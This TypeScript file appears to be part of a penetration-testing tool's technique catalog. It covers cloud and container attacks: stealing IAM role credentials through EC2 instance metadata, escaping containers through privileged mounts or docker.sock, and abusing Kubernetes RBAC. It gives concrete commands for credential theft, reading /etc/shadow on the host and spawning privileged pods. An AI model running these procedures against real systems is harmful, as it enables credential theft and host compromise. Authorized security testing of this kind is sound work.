/**
 * Technique catalog slice: cloud-container.
 */

import { CLOUD_CONTAINER_TECHNIQUES_EXTRA } from "./cloud_container_techniques_extra.ts";
import type { TechniqueEntry } from "./types.ts";
export const CLOUD_CONTAINER_TECHNIQUES: readonly TechniqueEntry[] = [
	{
		id: "cloud-imds-to-role",
		name: "EC2 IMDS → IAM role → cross-service pivot",
		domain: "cloud-container",
		mitre: ["T1552.007", "T1528", "T1210"],
		cwe: ["CWE-918", "CWE-285"],
		triggers: "SSRF or RCE on an EC2/instance with an IAM role attached; IMDS reachable.",
		procedure: [
			"Get IMDSv2 token (see web-ssrf-metadata), read `iam/security-credentials/<role>` → AccessKeyId/Secret/Token.",
			"`aws sts get-caller-identity` to confirm; enumerate the role's permissions (`aws iam list-attached-role-policies` if allowed, else brute with `enumerate-iam`/`pacu`).",
			"Pivot to S3 (`aws s3 ls`/`cp`), Secrets Manager, other roles (AssumeRole if trust allows), or the DB the role reaches.",
			"Map the blast radius: `pacu run iam__enum_permissions` + `iam__privesc_scan`.",
		],
		proofExit:
			"Stolen role creds call `sts:GetCallerIdentity` showing the role ARN AND access an unauthorized resource (bucket/secret/DB) the role reaches.",
		pitfalls: [
			"IMDSv2 + hop-limit 1 blocks containerized SSRF; confirm reachability before claiming.",
			"Session tokens expire (~6h); enumerate fast, document, don't persist.",
		],
		tools: ["aws", "curl", "python3", "jq"],
	},
	{
		id: "cloud-container-escape",
		name: "Container escape to host (privileged / capabilities / mounts)",
		domain: "cloud-container",
		mitre: ["T1611", "T1068"],
		cwe: ["CWE-250", "CWE-732"],
		triggers:
			"Container runs `--privileged`, has `CAP_SYS_ADMIN`/`CAP_DAC_READ_SEARCH`/`CAP_SYS_PTRACE`, or mounts host `/`/docker.sock; kernel CVEs (runc, CVE-2024-21626).",
		procedure: [
			"Self-check: `capsh --print`, `/proc/1/status` CapEff, `mount | grep -E ' / |docker.sock'`, `ls -la /dev`.",
			"Privileged + hostfs: `mkdir /host; mount /dev/sda1 /host; chroot /host`.",
			"docker.sock: `curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json`, then start a privileged container mounting `/`.",
			"CAP_SYS_ADMIN: cgroup-release_agent or `nsenter` into pid 1's namespaces.",
			"runc CVEs: exploit the specific handler (e.g. file-descriptor leak → hostfs access).",
		],
		proofExit:
			"Read/write a host file outside the container (`/host/etc/shadow`, hostfs path) OR spawn a host process; captured.",
		pitfalls: [
			"Seccomp/AppArmor can block even privileged containers — profile first.",
			"`/dev/sda1` may not be the root fs (LVM/RAID/overlay) — enumerate block devices.",
		],
		tools: ["docker", "kubectl", "python3", "bash"],
	},
	{
		id: "cloud-k8s-rbac",
		name: "Kubernetes RBAC abuse + pod escape",
		domain: "cloud-container",
		mitre: ["T1613", "T1611", "T1210"],
		cwe: ["CWE-285", "CWE-732"],
		triggers:
			"Compromised pod serviceaccount token; over-permissive RBAC (create pods, exec, get secrets, impersonate); API server reachable.",
		procedure: [
			"Read token: `/var/run/secrets/kubernetes.io/serviceaccount/token`, `namespace`, `ca.crt`; `kubectl --token ... auth can-i --list`.",
			"`get secrets` → extract DB/app secrets; `create pods` → spawn a privileged pod mounting hostfs → escape.",
			"`exec/create` into other pods; `impersonate` if allowed → escalate to cluster-admin.",
			"Map with `peirates`/`rbac-lookup`; pivot to cloud via node metadata if running on managed k8s.",
		],
		proofExit:
			"Serviceaccount performs an action beyond its intended scope (read another namespace's secret / spawn host-mount pod / impersonate cluster-admin); captured.",
		pitfalls: [
			"Token is namespaced + RBAC-scoped; `can-i --list` the real perms before assuming.",
			"Admission control (OPA/PodSecurity) may block privileged pods — test the gate.",
		],
		tools: ["kubectl", "curl", "python3", "bash"],
	},
	...CLOUD_CONTAINER_TECHNIQUES_EXTRA,
];
